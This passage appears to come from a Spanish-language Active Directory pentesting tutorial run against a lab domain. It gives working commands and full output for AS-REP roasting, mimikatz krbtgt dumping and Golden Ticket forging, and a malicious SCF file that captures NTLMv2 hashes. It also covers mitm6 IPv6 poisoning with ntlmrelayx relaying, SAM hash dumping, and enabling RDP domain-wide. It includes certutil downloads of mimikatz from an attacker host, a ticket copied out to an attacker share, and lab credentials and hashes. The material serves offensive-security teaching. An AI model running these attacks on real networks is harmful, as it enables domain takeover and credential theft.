Con Rubeus también podemos realizar este ataque sin necesidad de tener credenciales válidas, de la siguiente forma:

```bash
C:\Windows\Temp\test> Rubeus.exe asreproast /user:SVC_SQLservice /domain:felipecorp.local /dc:DC-Company 

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.1.2 


[*] Action: AS-REP roasting

[*] Target User            : SVC_SQLservice
[*] Target Domain          : felipecorp.local
[*] Target DC              : DC-Company

[*] Using domain controller: DC-Company (fe80::e59a:e2bb:ae:d059%2)
[*] Building AS-REQ (w/o preauth) for: 'felipecorp.local\SVC_SQLservice'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$SVC_SQLservice@felipecorp.local:C01298CA532157216FA91D9F6731A83C$6141
      A08AF1D07747EF7DFA4FAEF1DDB64F3878C04E8340FB8B0337B49060FEB6C6A8309BCC23151F1388
      F8110A623C6513F8C72D11E5ED3CA23B8ADE836C8D366FED4B7F777DEFFBD000E32526044188873C
      8341164FF98BB7E8AE1299CB6E82BC57E1D444AA485D1BA88B10C07AD10B1B7BB347A59D48E3221E
      E8AD759D1E5B90FABF67B81EB656D507E584716A72BFC69394EE12A3ED1107C738C07E3C3B70FE66
      C4EF3C13D60321BCE322E6E05B20C9E8FF55969AE10DFCD33DC3593BF6E05152E5B5479BC80C126A
      96FCB861DD78C60E297D8630C3EB7C269B10E2E853C21023FF15E1FD8DDC9E7C384D6FE933D22D92
      E550

```

> Obtener [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)


## Golden Ticket Attack

Para este proceso debemos ya estar dentro de la máquina víctima a la cual le subiremos ```mimikatz``` y haremos lo siguiente:

> Se recomienda ir guardando en un fichero aparte todo lo extraído de mimikatz.

```bash
┌──(root㉿kali)-[/AD/mimikatz]
└─ python -m http.server 80                                                            
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
┌──(root㉿kali)-[/AD]
└─ psexec.py felipeCorp.local/administrador:P@\$\$w0rd\!@10.1.1.35 cmd.exe
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.1.1.35.....
[*] Found writable share ADMIN$
[*] Uploading file nSEImBlt.exe
[*] Opening SVCManager on 10.1.1.35.....
[*] Creating service rtPP on 10.1.1.35.....
[*] Starting service rtPP.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.14393]

(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> cd ..

C:\Windows> cd ..

C:\> cd Windows

C:\Windows> cd Temp 

C:\Windows\Temp> mkdir test

C:\Windows\Temp> cd test

C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/mimikatz.exe mimikatz.exe   
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  000000  ...
  14afa0
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> dir
 El volumen de la unidad C no tiene etiqueta.
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 El n�mero de serie del volumen es: 940F-BBC0


 Directorio de C:\Windows\Temp\test

28/08/2022  10:48    <DIR>          .
28/08/2022  10:48    <DIR>          ..
28/08/2022  10:48         1.355.680 mimikatz.exe
               1 archivos      1.355.680 bytes
               2 dirs  38.950.723.584 bytes libres

C:\Windows\Temp\test> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/


mimikatz # lsadump::lsa /inject /name:krbtgt
mimikatz # Domain : FELIPECORP / S-1-5-21-2888511544-3073766740-2499246386

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : ac5da80acc5ae76888455289db036528
    LM   : 
  Hash NTLM: ac5da80acc5ae76888455289db036528
    ntlm- 0: ac5da80acc5ae76888455289db036528
    lm  - 0: 188091d140f305c71617c3799ca2a4b9

 * WDigest
    01  1aef6172fcfe22743bf84cbf1d6f684d
    02  60d6edcc921416dd4884b10f3646f6fc
    03  f4872a6de741ccd73a7e7bfb3dfdb6f9
    04  1aef6172fcfe22743bf84cbf1d6f684d
    05  60d6edcc921416dd4884b10f3646f6fc
    06  86e8b8da57c1efed68e55c13f245591d
    07  1aef6172fcfe22743bf84cbf1d6f684d
    08  0f78c00089e988bd39619862e61a313e
    09  0f78c00089e988bd39619862e61a313e
    10  8970fe777af1658ee05f8b970de239a4
    11  9be9ae12e66884a83ff5088fe7351c7b
    12  0f78c00089e988bd39619862e61a313e
    13  af940296fa2fe83364fc851ce4107536
    14  9be9ae12e66884a83ff5088fe7351c7b
    15  816769d7b838b5fec4c3af14e51354c6
    16  816769d7b838b5fec4c3af14e51354c6
    17  580c6353df57cc6cdc6a8fbe56be02c7
    18  133e2cf2e9ee0ae09f98eca3cb8e501b
    19  2f965959f58ff27b9db95ce933062f67
    20  867385417fc058f4ef5166484d7f01e7
    21  686670b4bf542e51471f2ac9126fe37f
    22  686670b4bf542e51471f2ac9126fe37f
    23  7e690347a1c377b9dd5fac55c8ce5819
    24  6fc075d86a94f12113be8dd044ae9557
    25  6fc075d86a94f12113be8dd044ae9557
    26  fc49602891a63b4e6a6a0b3b1f70374e
    27  46480468a2ae6a913c4fdccdb5a5cd5d
    28  fb06c1567d969e4452511c0026bb0b4e
    29  25334b85ada156c2a47b16e773208415

 * Kerberos
    Default Salt : FELIPECORP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 6e386b5ee0913b32

 * Kerberos-Newer-Keys
    Default Salt : FELIPECORP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : ffd0df3726eac769b99f83b0db604b8b46f99d54e1894eff14e65c0db75c4ac1
      aes128_hmac       (4096) : e092fa6f8ee342f7baa26bb1d7b32601
      des_cbc_md5       (4096) : 6e386b5ee0913b32

 * NTLM-Strong-NTOWF
    Random Value : eee3b2d1bb4114f71ead9e6d81941048

mimikatz # kerberos::golden /domain:felipecorp.local /sid:S-1-5-21-2888511544-3073766740-2499246386 /rc4:ac5da80acc5ae76888455289db036528 /user:administrador /ticket:golden.kirbi                                
mimikatz # User      : administrador
Domain    : felipecorp.local (FELIPECORP)
SID       : S-1-5-21-2888511544-3073766740-2499246386
User Id   : 500
Groups Id : *513 512 520 518 519 
ServiceKey: ac5da80acc5ae76888455289db036528 - rc4_hmac_nt      
Lifetime  : 28/08/2022 10:55:47 ; 25/08/2032 10:55:47 ; 25/08/2032 10:55:47
-> Ticket : golden.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

> Los datos del ```kerberos::golden``` se extraen de la información que se muestra tras ejecutar ```lsadump::lsa /inject /name:krbtgt```. Una vez terminado el proceso nos generará un archivo llamado ```golden.kirbi```
 

```bash

C:\Windows\Temp\test> dir
 El volumen de la unidad C no tiene etiqueta.
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 El n�mero de serie del volumen es: 940F-BBC0


 Directorio de C:\Windows\Temp\test

28/08/2022  12:34    <DIR>          .
28/08/2022  12:34    <DIR>          ..
28/08/2022  10:55             1.429 golden.kirbi
28/08/2022  10:48         1.355.680 mimikatz.exe

```

Ahora con el recurso ```smbserver``` de Impacket me voy a crear un recurso compartido a nivel de red, sincronizado con mi ruta absoluta:

```bash
┌──(root㉿kali)-[/AD]
└─ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Y me envío el archivo ```golden.kirbi``` a mi máquina atacante.

```bash

C:\Windows\Temp\test> copy golden.kirbi \\10.1.1.19\smbFolder\golden.kirbi
copy golden.kirbi \\10.1.1.19\smbFolder\golden.kirbi
        1 archivo(s) copiado(s).

```

Ingresamos a una máquina del dominio en que el usuario "administrador" tenga privilegios como "nt authority\system":

```bash
┌──(root㉿kali)-[/AD]
└─ psexec.py felipeCorp.local/administrador:P@\$\$w0rd\!@10.1.1.33 cmd.exe
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 10.1.1.33.....
[*] Found writable share ADMIN$
[*] Uploading file LtZlpKCY.exe
[*] Opening SVCManager on 10.1.1.33.....
[*] Creating service rUoy on 10.1.1.33.....
[*] Starting service rUoy.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.19042.631]

(c) 2020 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd ..

C:\Windows> cd temp

C:\Windows\Temp> mkdir test

C:\Windows\Temp> cd test

C:\Windows\Temp\test> dir \\DC-Company\admin$
Acceso denegado.
```

Podemos ver que a pesar de ser un usuario administrador sobre la IP 10.1.1.33, no podemos ingresar al directorio admin del DC-Company. Por tanto ahora con python procederé a enviar el archivo extraído anteriormente a esta máquina del dominio y realizaremos los siguientes pasos para poder conseguir acceso:

```bash
┌──(root㉿kali)-[/AD]
└─ python -m http.server 80                                
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/mimikatz.exe mimikatz.exe
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  000000  ...
  14afa0
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> certutil.exe -f -urlcache -split http://10.1.1.19/golden.kirbi golden.kirbi
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
****  En l�nea  ****

  0000  ...
  0595
CertUtil: -URLCache comando completado correctamente.

C:\Windows\Temp\test> dir
 El volumen de la unidad C no tiene etiqueta.
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 El n�mero de serie del volumen es: A47B-4A14


 Directorio de C:\Windows\Temp\test

28-08-2022  12:49    <DIR>          .
28-08-2022  12:49    <DIR>          ..
28-08-2022  12:49             1.429 golden.kirbi
28-08-2022  12:49         1.355.680 mimikatz.exe
               2 archivos      1.357.109 bytes
               2 dirs  23.840.804.864 bytes libres

C:\Windows\Temp\test> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::ptt golden.kirbi
* File: 'golden.kirbi': OK

exit
mimikatz # Bye!

C:\Windows\Temp\test> dir \\DC-Company\admin$
 El volumen de la unidad \\DC-Company\admin$ no tiene etiqueta.
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
 El n�mero de serie del volumen es: 940F-BBC0


 Directorio de \\DC-Company\admin$

28-08-2022  12:34    <DIR>          .
28-08-2022  12:34    <DIR>          ..
16-07-2016  15:23    <DIR>          ADFS
28-08-2022  04:21    <DIR>          ADWS
28-08-2022  03:50    <DIR>          appcompat
07-01-2017  07:10    <DIR>          AppPatch
28-08-2022  04:00    <DIR>          AppReadiness
28-08-2022  03:52    <DIR>          assembly
07-01-2017  07:10    <DIR>          bcastdvr
16-07-2016  15:18            61.440 bfsvc.exe
16-07-2016  15:23    <DIR>          Boot
16-07-2016  15:23    <DIR>          Branding
07-01-2017  07:11    <DIR>          CbsTemp
16-07-2016  15:23    <DIR>          Cursors
28-08-2022  04:44    <DIR>          debug
16-07-2016  15:23    <DIR>          diagnostics
17-07-2016  00:41    <DIR>          DigitalLocker
16-07-2016  15:23    <DIR>          drivers
27-08-2022  21:25             1.947 DtcInstall.log
17-07-2016  00:41    <DIR>          en-US
17-07-2016  00:41    <DIR>          es-ES
07-01-2017  07:09         4.673.304 explorer.exe
...

```

Como se puede apreciar, obtenemos acceso al directorio admin del DC-Company. Aunque otra forma de acceder teniendo pesistencia es con la herramienta ```ticketer.py```

```bash
┌──(root㉿kali)-[/AD]
└─ ticketer.py -nthash ac5da80acc5ae76888455289db036528 -domain-sid S-1-5-21-2888511544-3073766740-2499246386 -domain felipecorp.local administrador
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for felipecorp.local/administrador
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncAsRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncASRepPart
[*] Saving ticket in administrador.ccache
```

Una vez guardamos el ticket, debemos exportar una variable de entorno cuyo nombre será ```KRB5CCNAME```:

```bash
┌──(root㉿kali)-[/AD]
└─ export KRB5CCNAME="/home/user/AD/administrador.ccache"

Verificamos si fue creada con éxito:

┌──(root㉿kali)-[/AD]
└─ ls -l $KRB5CCNAME                                                                 
-rw-r--r-- 1 root root 1199 Aug 28 06:56 /home/user/AD/administrador.ccache
```

Con esto ganaremos persistencia, podremos ingresar a la máquina DC-Company aunque cambien la contraseña. 

```bash
┌──(root㉿kali)-[/AD]
└─ psexec.py -n -k felipeCorp.local/administrador@DC-Company cmd.exe
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on DC-Company.....
[*] Found writable share ADMIN$
[*] Uploading file yIAXWzOH.exe
[*] Opening SVCManager on DC-Company.....
[*] Creating service driC on DC-Company.....
[*] Starting service driC.....
[!] Press help for extra shell commands
[-] Decoding error detected, consider running chcp.com at the target,
map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
and then execute smbexec.py again with -codec and the corresponding codec
Microsoft Windows [Versi�n 10.0.14393]

(c) 2016 Microsoft Corporation. Todos los derechos reservados.

C:\Windows\system32> whoami
nt authority\system

```

## SCF File

Los archivos SCF (Shell Command Files) se puedan usar para realizar un conjunto limitado de operaciones, como mostrar el escritorio de Windows o abrir un explorador de Windows. También, se puede usar un archivo SCF para acceder a una ruta UNC específica lo que abre un brecha de seguridad que podemos aprovechar como atacantes. Ahora ocuparemos ```smbclient``` para este procedimiento pues con esta herramienta podemos ver recursos compartidos e incluso intentar subir un archivo malicioso.

```bash
┌──(root㉿kali)-[/AD]
└─ smbclient -U "felipecorp.local\fcanales%Password1" -L 10.1.1.35 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Admin remota
	C$              Disk      Recurso predeterminado
	IPC$            IPC       IPC remota
	NETLOGON        Disk      Recurso compartido del servidor de inicio de sesión 
	SharedFiles     Disk      
	SYSVOL          Disk      Recurso compartido del servidor de inicio de sesión

```

Ingresamos al recurso compartido:

```bash
┌──(root㉿kali)-[/AD]
└─ smbclient -U "felipecorp.local\fcanales%Password1" //10.1.1.35/SharedFiles
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Aug 28 09:08:00 2022
  ..                                  D        0  Sun Aug 28 09:08:00 2022

		12978687 blocks of size 4096. 9507933 blocks available
smb: \> 

```

Creamos el archivo SCF malicioso:

```bash
┌──(root㉿kali)-[/AD]
└─ nano file.scf
GNU nano 6.4 

[Shell]
Command=2
IconFile=\\10.1.1.19\smbFolder\test.ico
[Taskbar]
Command=ToggleDesktop
```

Ahora con el recurso ```smbserver``` de Impacket me voy a crear un recurso compartido a nivel de red, sincronizado con mi ruta absoluta pues por este medio recibiremos el hash:

```bash
┌──(root㉿kali)-[/AD]
└─ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Subimos el archivo con ```put``` :

```bash
smb: \> put file.scf
putting file file.scf as \file.scf (43.9 kb/s) (average 43.9 kb/s)
smb: \> dir
  .                                   D        0  Sun Aug 28 09:15:29 2022
  ..                                  D        0  Sun Aug 28 09:15:29 2022
  file.scf                            A       90  Sun Aug 28 09:15:29 2022

		12978687 blocks of size 4096. 9507933 blocks available

```

Ahora basta con que la víctima abra la carpeta SharedFiles para que nosotros por medio de ```smbserver``` obtengamos el hash NTLMv2:

![ldapdomaingroups](/images/SharedFilesscf.png)


```bash
┌──(root㉿kali)-[/AD]
└─ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.1.dev1+20220513.140233.fb1e50c1 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.1.1.35,53770)
[*] AUTHENTICATE_MESSAGE (FELIPECORP\Administrador,DC-COMPANY)
[*] User DC-COMPANY\Administrador authenticated successfully
[*] Administrador::FELIPECORP:aaaaaaaaaaaaaaaa:28a02647bba0dec44b0acb27a84c8e33:010100000000000000ee420025bbd8014c13685105def17d000000000100100046004b00650050004b007700510046000300100046004b00650050004b00770051004600020010006300440071006d005800630079005900040010006300440071006d0058006300790059000700080000ee420025bbd80106000400020000000800300030000000000000000000000000300000c265baeb06e93594cdf4b440884de48895e4ebe43cc3164b8489a833abc8cc500a0010000000000000000000000000000000000009001c0063006900660073002f00310030002e0031002e0031002e0031003900000000000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[*] Disconnecting Share(1:IPC$)
[*] Disconnecting Share(2:smbFolder)
[*] Closing down connection (10.1.1.35,53770)
[*] Remaining connections []
```

## IPv6

Si IPv4 se encuentra mitigado podemos realizar igualmente un envenamiento al dominio de la empresa con la herramienta ```mitm6```: 

```bash
┌──(root㉿kali)-[/AD]
└─ mitm6 -d felipeCorp.local
Starting mitm6 using the following configuration:
Primary adapter: eth0 [08:00:27:95:bd:54]
IPv4 address: 10.1.1.19
IPv6 address: fe80::a00:27ff:fe95:bd54
DNS local search domain: felipeCorp.local
DNS allowlist: felipecorp.local
IPv6 address fe80::5169:1 is now assigned to mac=08:00:27:80:e4:a7 host=PC-User2.felipecorp.local. ipv4=
IPv6 address fe80::5169:2 is now assigned to mac=08:00:27:09:4e:d6 host=PC-Felipe.felipecorp.local. ipv4=
Sent spoofed reply for wpad.felipecorp.local. to fe80::5169:2
Sent spoofed reply for wpad.felipecorp.local. to fe80::5169:2
Sent spoofed reply for wpad.felipecorp.local. to fe80::5169:2
Sent spoofed reply for DC-Company.felipecorp.local. to fe80::5169:2
Sent spoofed reply for DC-Company.felipecorp.local. to fe80::5169:2
```

Y como se puede apreciar los equipos de la empresas toman como prioridad mi IPv6:

![mitm6](/images/mitm6fin.png)

Por ejemplo si queremos acceder al equipo de "User2" realizamos lo siguiente con ```ntlmrelayx.py``` creando una conexión SOCK (para poder usar proxychains) y si esperamos un tiempo podremos ver que equipos tienen privilegios sobre el sistema del usuario "User2" escribiendo ```socks```:

```bash
┌──(root㉿kali)-[/AD]
└─ ./ntlmrelayx.py -6 -wh 10.1.1.19 -t smb://10.1.1.33 -socks -debug -smb2support                                                            
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/impacket
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack DCSYNC loaded..
[*] Running in relay mode to single host
[*] SOCKS proxy started. Listening at port 1080
[*] SMB Socks Plugin loaded..
[*] HTTP Socks Plugin loaded..
[*] MSSQL Socks Plugin loaded..
[*] IMAP Socks Plugin loaded..
[*] IMAPS Socks Plugin loaded..
[*] SMTP Socks Plugin loaded..
[*] HTTPS Socks Plugin loaded..
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
Type help for list of commands

 * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off

ntlmrelayx> socks
[*] No Relays Available!
[+] KeepAlive Timer reached. Updating connections
[+] KeepAlive Timer reached. Updating connections
[+] KeepAlive Timer reached. Updating connections
[*] SMBD-Thread-15: Received connection from ::ffff:10.1.1.32, attacking target smb://10.1.1.33
[*] Authenticating against smb://10.1.1.33 as FELIPECORP/FCANALES SUCCEED
[*] SOCKS: Adding FELIPECORP/FCANALES@10.1.1.33(445) to active SOCKS connection. Enjoy
[+] Checking admin status for user FELIPECORP/FCANALES
[+] isAdmin returned: TRUE
[+] No more targets

ntlmrelayx> socks
Protocol  Target     Username             AdminStatus  Port 
--------  ---------  -------------------  -----------  ----
SMB       10.1.1.33  FELIPECORP/FCANALES  TRUE         445 

```

Luego de identificar que el usuario "fcanales" tiene privilegios sobre "User2", creamos el tunel con proxychains editando la configuración de la siguiente forma:

```bash
┌──(root㉿kali)-[/AD]
└─ nano /etc/proxychains4.conf
```

![proxychains](/images/proxychainconf.png)

Como ahora tengo un relay de un usuario administrador sobre "User2", podremos autenticarnos ocupando ```proxychains``` y ```crackmapexec``` sin necesidad de conocer la contraseña:

```bash
┌──(root㉿kali)-[/AD]
└─ proxychains crackmapexec smb 10.1.1.33 -u 'fcanales' -p 'noesnecesaria' -d 'felipeCorp'                 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.33:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.33:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.33:135 <--denied
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 (name:PC-USER2) (domain:felipeCorp) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.33:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.33:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.1.1.33:445  ...  OK
SMB         10.1.1.33       445    PC-USER2         [+] felipeCorp\fcanales:noesnecesaria (Pwn3d!)
```

Y ahora nos podemos dumpear la SAM, limpiando lo que nos muestra ```proxychains```:

```bash
┌──(root㉿kali)-[/AD]
└─ proxychains crackmapexec smb 10.1.1.33 -u 'fcanales' -p 'cualquiercosa' -d 'felipeCorp' --sam 2>/dev/null
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 (name:PC-USER2) (domain:felipeCorp) (signing:False) (SMBv1:False)
SMB         10.1.1.33       445    PC-USER2         [+] felipeCorp\fcanales:noesnecesaria (Pwn3d!)
SMB         10.1.1.33       445    PC-USER2         [+] Dumping SAM hashes
SMB         10.1.1.33       445    PC-USER2         Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.1.33       445    PC-USER2         Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.1.33       445    PC-USER2         DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         10.1.1.33       445    PC-USER2         WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4910866e63e3c3eb380a12acd96e7c26:::
SMB         10.1.1.33       445    PC-USER2         User2:1003:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SMB         10.1.1.33       445    PC-USER2         [+] Added 5 SAM hashes to the database
```

Podemos intentar iniciar sesión con ```wmiexec.py``` (visto anteriormente), romper los hashes y obtener las contraseñas para ingresar al sistema o incluso con ```crackmapexec``` activar el RDP:

```bash
┌──(root㉿kali)-[/AD]
└─ crackmapexec smb 10.1.1.0/24 -u 'administrador' -p 'P@$$w0rd!' -M rdp -o action=enable
SMB         10.1.1.2        445    DESKTOP-T90A0NM  [*] Windows 10.0 Build 19041 x64 (name:DESKTOP-T90A0NM) (domain:DESKTOP-T90A0NM) (signing:False) (SMBv1:False)
SMB         10.1.1.33       445    PC-USER2         [*] Windows 10.0 Build 19041 x64 (name:PC-USER2) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.35       445    DC-COMPANY       [*] Windows Server 2016 Datacenter Evaluation 14393 x64 (name:DC-COMPANY) (domain:felipecorp.local) (signing:True) (SMBv1:True)
SMB         10.1.1.32       445    PC-FELIPE        [*] Windows 10.0 Build 19041 x64 (name:PC-FELIPE) (domain:felipecorp.local) (signing:False) (SMBv1:False)
SMB         10.1.1.2        445    DESKTOP-T90A0NM  [-] DESKTOP-T90A0NM\administrador:P@$$w0rd! STATUS_LOGON_FAILURE 
SMB         10.1.1.33       445    PC-USER2         [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)
SMB         10.1.1.35       445    DC-COMPANY       [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)
SMB         10.1.1.32       445    PC-FELIPE        [+] felipecorp.local\administrador:P@$$w0rd! (Pwn3d!)
RDP         10.1.1.33       445    PC-USER2         [+] RDP enabled successfully
RDP         10.1.1.35       445    DC-COMPANY       [+] RDP enabled successfully
RDP         10.1.1.32       445    PC-FELIPE        [+] RDP enabled successfully
```


## Bloodhound & Neo4j

Para iniciar, debemos instalar tanto ```bloodhound``` como ```neo4j```:

```bash
┌──(root㉿kali)-[/AD]
└─ apt install bloodhound neo4j
```

En caso de algún problema checkear que la versión del java no sea tan antigua:

```bash
┌──(root㉿kali)-[/AD]
└─ update-alternatives --config java
```

Con ```neo4j``` nos montamos el servidor:

```bash
┌──(root㉿kali)-[/AD]
└─ neo4j console         
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /usr/share/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /usr/share/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /usr/share/neo4j/run
Starting Neo4j.
2022-08-29 00:37:23.752+0000 INFO  Starting...
2022-08-29 00:37:25.422+0000 INFO  This instance is ServerId{a42a6a64} (a42a6a64-60a8-4f03-800e-80354687894a)
2022-08-29 00:37:28.677+0000 INFO  ======== Neo4j 4.4.7 ========
2022-08-29 00:37:32.846+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2022-08-29 00:37:32.881+0000 INFO  Setting up initial user from defaults: neo4j
2022-08-29 00:37:32.881+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2022-08-29 00:37:32.896+0000 INFO  Setting version for 'security-users' to 3
2022-08-29 00:37:32.902+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
